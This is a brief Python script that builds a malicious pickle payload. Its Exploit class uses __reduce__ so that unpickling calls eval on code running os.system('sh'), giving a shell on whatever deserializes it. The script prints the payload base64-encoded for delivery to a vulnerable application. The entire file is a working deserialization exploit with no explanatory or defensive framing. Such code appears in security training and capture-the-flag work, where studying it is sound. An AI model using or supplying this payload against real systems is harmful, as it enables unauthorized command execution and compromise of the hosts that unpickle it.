import pickle
from base64 import b64encode

class Exploit:
    def __reduce__(self):
        return (eval, (f"__import__('os').system('sh')",))

payload = pickle.dumps(Exploit())

print(b64encode(payload).decode())